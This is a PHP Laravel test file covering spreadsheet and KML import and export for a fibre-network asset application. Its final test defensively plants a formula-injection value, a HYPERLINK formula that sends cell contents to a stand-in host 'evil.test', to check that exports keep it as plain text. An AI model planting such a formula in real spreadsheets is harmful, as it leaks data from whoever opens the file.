<?php

namespace Tests\Feature;

use App\Enums\PortStatus;
use App\Enums\Role;
use App\Models\Area;
use App\Models\Cable;
use App\Models\CoreSplice;
use App\Models\CoreTermination;
use App\Models\Customer;
use App\Models\Odc;
use App\Models\Odp;
use App\Models\SpliceBox;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use OpenSpout\Common\Entity\Row;
use OpenSpout\Writer\XLSX\Writer;
use Tests\TestCase;
use ZipArchive;

class DataTransferTest extends TestCase
{
    use RefreshDatabase;

    private Area $area;

    protected function setUp(): void
    {
        parent::setUp();

        $this->area = Area::factory()->create(['code' => 'BDG']);
        $this->actingAs(User::factory()->create(['area_id' => $this->area->id, 'role' => Role::AdminArea]));
    }

    /**
     * @param  array<string, list<list<mixed>>>  $sheets  sheet name => rows (first row is the header)
     */
    private function xlsx(array $sheets): UploadedFile
    {
        $path = tempnam(sys_get_temp_dir(), 'xlsx');
        $writer = new Writer;
        $writer->openToFile($path);
        $first = true;
        foreach ($sheets as $name => $rows) {
            ($first ? $writer->getCurrentSheet() : $writer->addNewSheetAndMakeItCurrent())->setName($name);
            $first = false;
            foreach ($rows as $row) {
                $writer->addRow(Row::fromValues($row));
            }
        }
        $writer->close();

        return new UploadedFile($path, 'data.xlsx', null, null, true);
    }

    private function fileFrom(string $content, string $name): UploadedFile
    {
        $path = tempnam(sys_get_temp_dir(), 'imp');
        file_put_contents($path, $content);

        return new UploadedFile($path, $name, null, null, true);
    }

    private function import(UploadedFile $file, array $options = []): array
    {
        $this->post('/data/import', ['file' => $file, ...$options])->assertRedirect()->assertSessionHasNoErrors();

        return session('importResult');
    }

    public function test_excel_import_creates_odcs_and_odps_with_ports()
    {
        $result = $this->import($this->xlsx([
            'ODC' => [
                ['Kode', 'Nama', 'Latitude', 'Longitude', 'Kapasitas', 'Splitter'],
                ['ODC-1', 'ODC Dago', '-6,9000', '107,6000', 48, '1/8'], // decimal commas and "1/8" as typed by people
            ],
            'ODP' => [
                ['kode', 'kode_odc', 'port_odc', 'lat', 'lng', 'kapasitas', 'no_tiang', 'tanggal_pasang'],
                ['ODP-1', 'ODC-1', 1, -6.901, 107.601, 16, 'T-1', '31/01/2025'],
                [],
                ['ODP-2', 'odc-1', 2, -6.902, 107.602, 8, null, null],
            ],
        ]));

        $this->assertTrue($result['ok'], json_encode($result['errors']));
        $this->assertSame(['odc' => 1, 'odp' => 2, 'cable' => 0], $result['created']);

        $odc = Odc::firstWhere('code', 'ODC-1');
        $this->assertSame([-6.9, 107.6, '1:8'], [$odc->lat, $odc->lng, $odc->splitter_ratio]);

        $odp = Odp::firstWhere('code', 'ODP-1');
        $this->assertSame([$odc->id, 1, 16, 'T-1', '2025-01-31'], [$odp->odc_id, $odp->odc_port, $odp->ports()->count(), $odp->pole_number, $odp->installed_at->format('Y-m-d')]);
        $this->assertSame($odc->id, Odp::firstWhere('code', 'ODP-2')->odc_id);
    }

    public function test_any_invalid_row_cancels_the_whole_import_and_lists_every_error()
    {
        $result = $this->import($this->xlsx([
            'ODP' => [
                ['kode', 'latitude', 'longitude', 'kapasitas', 'kode_odc', 'port_odc'],
                ['ODP-OK', -6.9, 107.6, 8, null, null],
                ['ODP-X', 'abc', 107.6, 8, null, null],
                ['ODP-Y', -6.9, 107.6, 100, null, null],
                ['ODP-Z', -6.9, 107.6, 8, 'ODC-TIDAK-ADA', 1],
                ['ODP-OK', -6.9, 107.6, 8, null, null],
            ],
        ]));

        $this->assertFalse($result['ok']);
        $this->assertSame(0, Odp::count());
        $this->assertSame(['ODP baris 3', 'ODP baris 4', 'ODP baris 5', 'ODP baris 6'], array_column($result['errors'], 'where'));
    }

    public function test_updates_keep_blank_cells_and_protect_used_ports()
    {
        $odp = Odp::factory()->for($this->area)->create(['code' => 'ODP-1', 'capacity' => 16, 'address' => 'Jl. Lama', 'lat' => -6.9, 'lng' => 107.6]);

        $result = $this->import($this->xlsx(['ODP' => [['kode', 'nama', 'alamat'], ['ODP-1', 'Baru', null]]]));
        $this->assertSame(['odc' => 0, 'odp' => 1, 'cable' => 0], $result['updated']);
        $odp->refresh();
        $this->assertSame(['Baru', 'Jl. Lama', -6.9], [$odp->name, $odp->address, $odp->lat]);

        $odp->ports()->where('number', 12)->update(['status' => PortStatus::Terpakai]);
        $result = $this->import($this->xlsx(['ODP' => [['kode', 'kapasitas'], ['ODP-1', 8]]]));
        $this->assertFalse($result['ok']);
        $this->assertSame(16, $odp->fresh()->capacity);
    }

    public function test_codes_from_another_area_are_rejected()
    {
        $other = Odp::factory()->create(['code' => 'ODP-LAIN']);
        Odp::withoutGlobalScopes()->whereKey($other->id)->update(['area_id' => Area::factory()->create()->id]);

        $result = $this->import($this->xlsx(['ODP' => [['kode', 'nama'], ['ODP-LAIN', 'x']]]));

        $this->assertFalse($result['ok']);
        $this->assertStringContainsString('area lain', $result['errors'][0]['message']);
    }

    public function test_kml_points_are_classified_and_lines_attach_to_nearby_assets()
    {
        $kml = <<<'KML'
            <?xml version="1.0" encoding="UTF-8"?>
            <kml xmlns="http://www.opengis.net/kml/2.2"><Document>
              <Placemark><name>ODC Dago</name><Point><coordinates>107.6,-6.9,0</coordinates></Point></Placemark>
              <Folder><name>Titik ODP</name>
                <Placemark><name>D-01</name><Point><coordinates>107.602,-6.9,0</coordinates></Point></Placemark>
              </Folder>
              <Placemark><name>Warung</name><Point><coordinates>107.61,-6.9,0</coordinates></Point></Placemark>
              <Placemark><name>Feeder Dago</name><LineString><coordinates>107.60005,-6.9 107.601,-6.901 107.60201,-6.9</coordinates></LineString></Placemark>
            </Document></kml>
            KML;

        $result = $this->import($this->fileFrom($kml, 'peta.kml'));

        $this->assertTrue($result['ok'], json_encode($result['errors']));
        $this->assertSame(['odc' => 1, 'odp' => 1, 'cable' => 1], $result['created']);
        $this->assertSame(['KML "Warung"'], array_column($result['skipped'], 'where'));

        $cable = Cable::sole();
        $this->assertSame(['feeder', 48], [$cable->type->value, $cable->cores]);
        $this->assertSame(['odc', 'odp'], [$cable->from_type, $cable->to_type]);
        $this->assertSame([-6.9, 107.6], $cable->path[0]); // snapped onto the ODC
    }

    public function test_kmz_is_read()
    {
        $path = tempnam(sys_get_temp_dir(), 'kmz');
        $zip = new ZipArchive;
        $zip->open($path, ZipArchive::OVERWRITE);
        $zip->addFromString('doc.kml', '<kml xmlns="http://www.opengis.net/kml/2.2"><Placemark><name>ODP-K1</name><Point><coordinates>107.6,-6.9</coordinates></Point></Placemark></kml>');
        $zip->close();

        $result = $this->import(new UploadedFile($path, 'peta.kmz', null, null, true));

        $this->assertTrue($result['ok']);
        $this->assertTrue(Odp::where('code', 'ODP-K1')->exists());
    }

    public function test_exports_import_back_without_changes()
    {
        $odc = Odc::factory()->for($this->area)->create(['code' => 'ODC-1', 'lat' => -6.9, 'lng' => 107.6]);
        $odp = Odp::factory()->for($this->area)->create(['code' => 'ODP-1', 'odc_id' => $odc->id, 'odc_port' => 3, 'lat' => -6.901, 'lng' => 107.601]);
        Cable::create(['area_id' => $this->area->id, 'type' => 'distribusi', 'cores' => 12, 'code' => 'K-1', 'path' => [[-6.9, 107.6], [-6.901, 107.601]]]);
        Cable::create(['area_id' => $this->area->id, 'type' => 'drop', 'cores' => 1, 'path' => [[-6.901, 107.601], [-6.902, 107.602]]]);

        $xlsx = $this->get('/data/export/xlsx')->assertOk()->streamedContent();
        $result = $this->import($this->fileFrom($xlsx, 'ekspor.xlsx'));
        $this->assertTrue($result['ok'], json_encode($result['errors']));
        $this->assertSame(['odc' => 1, 'odp' => 1, 'cable' => 0], $result['updated']);
        $this->assertSame(['odc' => 0, 'odp' => 0, 'cable' => 0], $result['created']);
        $this->assertSame([$odc->id, 3], [$odp->fresh()->odc_id, $odp->fresh()->odc_port]);

        $kml = $this->get('/data/export/kml')->assertOk()->streamedContent();
        $this->assertStringContainsString('<name>ODP-1</name>', $kml);
        $result = $this->import($this->fileFrom($kml, 'ekspor.kml'));
        $this->assertTrue($result['ok'], json_encode($result['errors']));
        $this->assertSame(['odc' => 1, 'odp' => 1, 'cable' => 1], $result['updated']);
        $this->assertSame(1, $result['created']['cable']); // the drop cable has no code to match on
    }

    public function test_only_admins_import_and_viewers_cannot_export()
    {
        $this->actingAs(User::factory()->create(['area_id' => $this->area->id, 'role' => Role::Teknisi]))
            ->post('/data/import', ['file' => $this->fileFrom('<kml/>', 'a.kml')])
            ->assertForbidden();
        $this->get('/data/export/kml')->assertOk();

        // The export carries customer data on the port sheet.
        $this->actingAs(User::factory()->create(['area_id' => $this->area->id, 'role' => Role::Viewer]));
        $this->get('/data/export/kml')->assertForbidden();
        $this->get('/data/export/xlsx')->assertForbidden();
        $this->get('/data/template')->assertOk();
    }

    public function test_excel_export_has_joints_cores_splices_and_terminations()
    {
        $odp = Odp::factory()->for($this->area)->create(['code' => 'ODP-T']);
        $box = SpliceBox::factory()->for($this->area)->create(['code' => 'JB-T', 'type' => 'roset']);
        $a = Cable::create(['area_id' => $this->area->id, 'code' => 'KBL-A', 'type' => 'distribusi', 'cores' => 24, 'tube_size' => 12, 'path' => [[-6.9, 107.6], [-6.91, 107.6]]]);
        $b = Cable::create(['area_id' => $this->area->id, 'code' => 'KBL-B', 'type' => 'distribusi', 'cores' => 12, 'path' => [[-6.91, 107.6], [-6.92, 107.6]]]);
        $a14 = $a->coreRows()->where('number', 14)->sole();
        $b1 = $b->coreRows()->where('number', 1)->sole();
        CoreSplice::create(['location_type' => 'joint', 'location_id' => $box->id, 'core_a_id' => $a14->id, 'core_a_side' => 'to', 'core_b_id' => $b1->id, 'core_b_side' => 'from']);
        CoreTermination::create(['core_id' => $b1->id, 'side' => 'to', 'location_type' => 'odp', 'location_id' => $odp->id, 'kind' => 'input', 'port' => 1]);
        Customer::create(['area_id' => $this->area->id, 'name' => 'Tanpa Port', 'lat' => -6.9, 'lng' => 107.6]);

        // Nothing from another area.
        $other = Area::factory()->create();
        $lain = Cable::create(['code' => 'KBL-LAIN', 'type' => 'feeder', 'cores' => 12, 'path' => [[-6.0, 107.0], [-6.1, 107.0]]]);
        Cable::withoutGlobalScopes()->whereKey($lain->id)->update(['area_id' => $other->id]);

        $sheets = $this->readExport();

        $this->assertSame(['ODC', 'POP-OLT', 'POP', 'ODP', 'Joint-Roset', 'Pelanggan', 'Kabel', 'Core', 'Sambungan', 'Terminasi'], array_keys($sheets));
        $this->assertSame(['JB-T', 'Roset'], array_slice($sheets['Joint-Roset'][1], 0, 2));
        $this->assertSame($this->area->code, $sheets['POP'][1][0]);
        $this->assertSame('Tanpa Port', $sheets['Pelanggan'][1][3]);
        $this->assertSame(['KBL-A', 'KBL-B'], array_column(array_slice($sheets['Kabel'], 1), 1));

        $cores = collect(array_slice($sheets['Core'], 1));
        $this->assertCount(36, $cores);
        $core14 = $cores->first(fn ($r) => $r[0] === 'KBL-A' && $r[1] === 14);
        $this->assertSame([2, 'Oranye', 'Oranye'], array_slice($core14, 2, 3));
        $this->assertSame('Sambung ke KBL-B core 1 di JB-T', $core14[6]);
        $this->assertStringContainsString('Input splitter 1 ODP-T', $cores->first(fn ($r) => $r[0] === 'KBL-B' && $r[1] === 1)[6]);

        $this->assertSame(['JB-T', 'Joint/Roset', 'KBL-A', 14, 'to', 'KBL-B', 1, 'from'], array_slice($sheets['Sambungan'][1], 0, 8));
        $this->assertSame(['ODP-T', 'ODP', 'input splitter', 1, 'KBL-B', 1, 'to'], array_slice($sheets['Terminasi'][1], 0, 7));
    }

    /**
     * @return array<string, list<list<mixed>>>
     */
    private function readExport(): array
    {
        $file = tempnam(sys_get_temp_dir(), 'xlsx');
        file_put_contents($file, $this->get('/data/export/xlsx')->assertOk()->streamedContent());
        $reader = new \OpenSpout\Reader\XLSX\Reader;
        $reader->open($file);
        $sheets = [];
        foreach ($reader->getSheetIterator() as $sheet) {
            foreach ($sheet->getRowIterator() as $row) {
                $sheets[$sheet->getName()][] = $row->toArray();
            }
        }
        $reader->close();
        unlink($file);

        return $sheets;
    }

    public function test_exported_text_never_becomes_an_excel_formula()
    {
        Odc::factory()->for($this->area)->create(['code' => 'ODC-F', 'address' => '=HYPERLINK("http://evil.test/?d="&A2,"Klik")']);
        $this->actingAs(User::factory()->create(['area_id' => $this->area->id, 'role' => Role::Teknisi]));

        $file = tempnam(sys_get_temp_dir(), 'xlsx');
        file_put_contents($file, $this->get('/data/export/xlsx')->assertOk()->streamedContent());
        $zip = new \ZipArchive;
        $zip->open($file);
        $xml = $zip->getFromName('xl/worksheets/sheet1.xml');
        $zip->close();
        unlink($file);

        $this->assertStringContainsString('HYPERLINK', $xml);
        $this->assertStringNotContainsString('<f>', $xml);
    }
}
